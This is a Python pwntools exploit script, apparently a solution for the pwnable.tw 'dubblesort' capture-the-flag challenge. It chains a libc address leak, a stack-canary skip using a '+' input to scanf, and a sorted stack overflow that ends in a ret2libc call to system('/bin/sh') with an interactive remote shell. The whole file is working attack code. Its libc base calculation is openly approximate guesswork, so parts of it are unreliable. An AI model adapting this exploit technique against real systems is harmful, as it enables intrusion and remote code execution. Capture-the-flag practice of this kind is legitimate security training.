#!/usr/bin/env python3
"""
pwnable.tw - dubblesort (200 pts)

Vulnerabilities:
1. Info leak: read() doesn't null-terminate. Stack has libc address.
2. Stack overflow: No bounds check on number count.
3. Canary bypass: scanf("%u") with "+" skips writing.
4. Sort awareness: ROP chain must be ascending.
"""

from pwn import *

context.arch = "i386"
context.log_level = "info"

HOST = "chall.pwnable.tw"
PORT = 10101

# Libc offsets (from libc_32.so.6)
SYSTEM_OFFSET = 0x3A940
BINSH_OFFSET = 0x158E8B


def exploit(local=False):
    if local:
        r = process("./dubblesort", env={"LD_PRELOAD": "./libc_32.so.6"})
    else:
        r = remote(HOST, PORT)

    # Step 1: Leak libc address
    # There's a null byte at offset 24. We need to overwrite it to leak.
    # The libc address is further in the buffer. Common offset is around 28-32.
    # We'll send enough to overwrite nulls but preserve the libc address.

    r.recvuntil(b"What your name :")

    # Send enough bytes to cover null bytes, but not overwrite libc addr
    # The libc address appears to be at a higher offset
    # Try sending bytes that end just before the libc address
    r.send(b"A" * 28)

    r.recvuntil(b"Hello ")
    data = r.recvuntil(b",How many")
    data = data[:-len(b",How many")]

    log.info(f"Received {len(data)} bytes")
    log.info(f"Hex: {data.hex()}")

    # Check if we have more than our input (meaning we got a leak)
    if len(data) <= 28:
        log.error("No leak! Trying different approach...")
        r.close()
        return

    # Extract leaked bytes after our input
    leak_bytes = data[28:]
    log.info(f"Leak bytes ({len(leak_bytes)}): {leak_bytes.hex()}")

    # The first 4 bytes after our input should be the libc address
    # But we need to handle partial leaks due to null bytes in the address
    if len(leak_bytes) >= 4:
        leak = u32(leak_bytes[:4])
    else:
        # Partial leak - pad with expected high byte (0xf7 for older, varies for newer)
        leak_bytes = leak_bytes.ljust(4, b"\x00")
        leak = u32(leak_bytes)

    log.info(f"Leaked value: {hex(leak)}")

    # Calculate libc base
    # The leaked value is typically from __libc_start_main area
    # Offset 0x18540 + 247 = 0x18637 for __libc_start_main_ret
    # But we might be leaking a different address, need to adjust
    libc_base = leak - 0x1B0000  # Approximate offset, will adjust
    libc_base = libc_base & 0xFFFFF000

    log.info(f"Libc base (estimated): {hex(libc_base)}")

    system_addr = libc_base + SYSTEM_OFFSET
    binsh_addr = libc_base + BINSH_OFFSET

    log.info(f"system(): {hex(system_addr)}")
    log.info(f"/bin/sh: {hex(binsh_addr)}")

    # Step 2: Overflow numbers array
    r.recvuntil(b"sort :")
    count = 35
    r.sendline(str(count).encode())

    for i in range(count):
        r.recvuntil(b"number :")

        if i == 24:
            r.sendline(b"+")
        elif i < 24:
            r.sendline(str(i + 1).encode())
        else:
            if i <= 31:
                padding = libc_base + 0x1000 * (i - 24)
                r.sendline(str(padding).encode())
            elif i == 32:
                r.sendline(str(system_addr).encode())
            elif i == 33:
                dummy = libc_base + 0x100000
                r.sendline(str(dummy).encode())
            elif i == 34:
                r.sendline(str(binsh_addr).encode())
            else:
                r.sendline(str(binsh_addr + (i - 34)).encode())

    log.success("Payload sent!")
    r.interactive()


if __name__ == "__main__":
    import sys
    local = len(sys.argv) > 1 and sys.argv[1] == "local"
    exploit(local)
